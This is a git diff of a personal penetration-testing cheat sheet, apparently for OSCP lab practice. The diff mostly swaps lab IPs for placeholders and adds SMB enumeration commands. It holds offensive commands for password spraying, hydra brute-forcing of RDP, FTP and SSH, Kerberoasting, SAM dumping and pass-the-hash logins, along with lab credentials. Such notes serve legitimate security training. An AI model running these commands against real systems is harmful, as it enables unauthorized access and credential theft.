@@ -102,16 +102,6 @@ Add color to windows GUI cmd for winpeas
 
 ---
 
-**Make SMB share for file transfer through firewall:**
-
-on kali start SMB share
-
-`python3 /usr/share/doc/python3-impacket/examples/smbserver.py share-dir /tmp -smb2support`
-
-then on target behind firewall we can copy files like so:
-
-`copy <FileName> \\<IP>\share-dir\<FileName>`
-
 ## Initial access reminders
 
 **Check out LDAP scan always**
@@ -239,7 +229,7 @@ Get owner and access controls on service/script/file in powershell:
 
 ---
 
-## Priv Esc
+## Windows Priv Esc
 
 **ALWAYS CHECK TokenZ**
 
@@ -472,26 +462,26 @@ Find shares on Network
 ### Creds:
 
 - `cme smb 192.168.215.104 -u 'user' -p 'PASS' -d 'oscp.exam' --users`
-- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute`
-- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' -d 'oscp.exam' --groups`
-- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users`
-- `crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam`
+- `crackmapexec smb <IP> -u 'user' -p 'PASS' --rid-brute`
+- `crackmapexec smb <IP> -u 'user' -p 'PASS' -d 'oscp.exam' --groups`
+- `crackmapexec smb <IP> -u 'user' -p 'PASS' --local-users`
+- `crackmapexec smb <IP> -u 'Administrator' -p 'PASS' --local-auth --sam`
 
 ### LDAP
 
 ### Creds:
 
-`ldapsearch -x -H ldap://172.16.250.10 -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
+`ldapsearch -x -H ldap://<IP> -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
 
 ### RPC
 
 ### No Creds:
 
-`rpcclient -U "" -N 10.10.10.X`
+`rpcclient -U "" -N <IP>`
 
 ### Creds:
 
-`rpcclient -U "medtech.com/wario%Mushroom!" 172.16.250.10`
+`rpcclient -U "medtech.com/wario%Mushroom!" <IP>`
 
 ---
 
@@ -549,21 +539,21 @@ Find shares on Network
 
 ### LDAP
 
-- `ldapsearch -x -H ldap://172.16.250.10 -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
-- `ldapsearch -x -H ldap://172.16.250.10 -D 'wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
+- `ldapsearch -x -H ldap://<IP> -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
+- `ldapsearch -x -H ldap://<IP> -D 'wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
 
 ### SMB
 
-- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' -d 'oscp.exam' --shares`
-- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-auth --shares`
-- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions`
-- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers`
+- `crackmapexec smb <IP> -u 'user' -p 'PASS' -d 'oscp.exam' --shares`
+- `crackmapexec smb <IP> -u 'user' -p 'PASS' --local-auth --shares`
+- `crackmapexec smb <IP> -u 'user' -p 'PASS' --sessions`
+- `crackmapexec smb <IP> -u 'user' -p 'PASS' --lusers`
 
 ### SNMP
 
-- `sudo nmap -sU -p 161 --script snmp-brute 192.168.194.149`
-- `sudo nmap -sU -p 161 --script snmp-win32-users 192.168.194.149`
-- `onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.194.149`
+- `sudo nmap -sU -p 161 --script snmp-brute <IP>`
+- `sudo nmap -sU -p 161 --script snmp-win32-users <IP>`
+- `onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <IP>`
 - `snmpwalk -v 1 -c public 192.168.194.149 NET-SNMP-EXTEND-MIB::nsExtendObjects`
 - `snmpwalk -v2c -c public 192.168.194.149 | grep <string>`
     - STRING
@@ -577,11 +567,11 @@ Find shares on Network
 
 ### Kerberos
 
-`impacket-GetUserSPNs corp.com/meg:'VimForPowerShell123!' -dc-ip 192.168.201.70 -outputfile hashes.kerb`
+`impacket-GetUserSPNs corp.com/meg:'VimForPowerShell123!' -dc-ip <IP> -outputfile hashes.kerb`
 
 ### AS-REP Roast
 
-`impacket-GetNPUsers corp.com/meg:'VimForPowerShell123!' -dc-ip 192.168.201.70 -outputfile dave.hash`
+`impacket-GetNPUsers corp.com/meg:'VimForPowerShell123!' -dc-ip <IP> -outputfile dave.hash`
 
 ---
 
@@ -605,39 +595,39 @@ Find shares on Network
 
 ### Kerberos
 
-**Password Spray** `proxychains -q /home/kali/go/bin/kerbrute passwordspray -d oscp.exam users.txt hghgib6vHT3bVWf --dc 10.10.103.152 -vvv` 
+**Password Spray** `proxychains -q /home/kali/go/bin/kerbrute passwordspray -d oscp.exam users.txt hghgib6vHT3bVWf --dc <IP> -vvv` 
 
-**Bruteforce** `proxychains -q /home/kali/go/bin/kerbrute bruteuser -d oscp.exam jeffadmin passwords.txt --dc 10.10.103.152 -vvv`
+**Bruteforce** `proxychains -q /home/kali/go/bin/kerbrute bruteuser -d oscp.exam jeffadmin passwords.txt --dc <IP> -vvv`
 
 ### SMB
 
-`proxychains -q /home/kali/.local/bin/cme smb 172.16.201.10-14 172.16.201.82-83 -u users.txt -p passwords.txt -d medtech.com --continue-on-success`
+`proxychains -q /home/kali/.local/bin/cme smb <IP> -u users.txt -p passwords.txt -d medtech.com --continue-on-success`
 
-`proxychains -q /home/kali/.local/bin/cme smb 172.16.201.10-14 172.16.201.82-83 -u users.txt -p passwords.txt --continue-on-success`
+`proxychains -q /home/kali/.local/bin/cme smb <IP> -u users.txt -p passwords.txt --continue-on-success`
 
-`cme smb 192.168.201.10 -u users.txt -H '<HASH>' --continue-on-success`
+`cme smb <IP> -u users.txt -H '<HASH>' --continue-on-success`
 
-`cme smb 192.168.201.10 -u users.txt -p passwords.txt --continue-on-success --local-auth`
+`cme smb <IP> -u users.txt -p passwords.txt --continue-on-success --local-auth`
 
 ### RDP
 
-`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt rdp://192.168.232.218:3389 -u -vV -T 40 -I`
+`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt rdp://<IP>:3389 -u -vV -T 40 -I`
 
-`hydra -V -f -L users.txt -P passwords.txt rdp://192.168.232.218 -u -vV -T 40 -I`
+`hydra -V -f -L users.txt -P passwords.txt rdp://<IP> -u -vV -T 40 -I`
 
 ### WinRM
 
-`evil-winrm -i 192.168.201.10 -u jeffadmin -p 'password'`
+`evil-winrm -i <IP> -u jeffadmin -p 'password'`
 
-`evil-winrm -i 192.168.201.10 -u jeffadmin -H 'HASH'`
+`evil-winrm -i <IP> -u jeffadmin -H 'HASH'`
 
 ### FTP
 
-`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ftp://192.168.232.218:21 -u -vV -T 40 -I`
+`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ftp://<IP>:21 -u -vV -T 40 -I`
 
 ### SSH
 
-`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ssh://192.168.232.218:22 -u -vV -T 40 -I`
+`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ssh://<IP>:22 -u -vV -T 40 -I`
 
 ## SMB Server (Windows)
 
@@ -650,6 +640,51 @@ If you can't move file from Kali to the internal network, you can create a new s
 
 `New-SmbSHare -Name 'temp' -Path 'C:\temp' -FullAccess everyone`
 
-**On M2:** `net use \\10.10.10.20\temp`
+**On M2:** `net use \\<IP>\temp`
 
 `copy \\10.10.10.20\temp\nc.exe C:\nc.exe`
+
+# SMB
+
+**Start SMB share**
+
+`sudo impacket-smbserver -smb2support test MS01`
+
+
+**Nmap scan for vulns**
+
+`sudo n*map -T5 -sV --script 'smb-vuln*' <IP>`
+
+**List shares:**
+
+`smbclient -L \\<IP>\ -N`
+
+`crackmapexec smb <IP> -u '' “ -p '' “ --shares`
+
+`smbmap -H <IP> -R`
+
+`smbmap -H <IP> -u df`
+
+**connect with no creds:**
+
+`smbclient //<IP>/<sharename> -U ""%""`
+
+`smbclient //<IP>/<sharename> -N`
+
+**RPC** 
+
+- if no password required SMB/try in general:
+
+`rpcclient -U  '' -N <IP>`
+
+- then run this to list users
+
+`enumdomusers`
+
+- or groups
+
+`enumdomgroups`
+
+- and query # user in groups:
+
+`querygroup <rid #>`
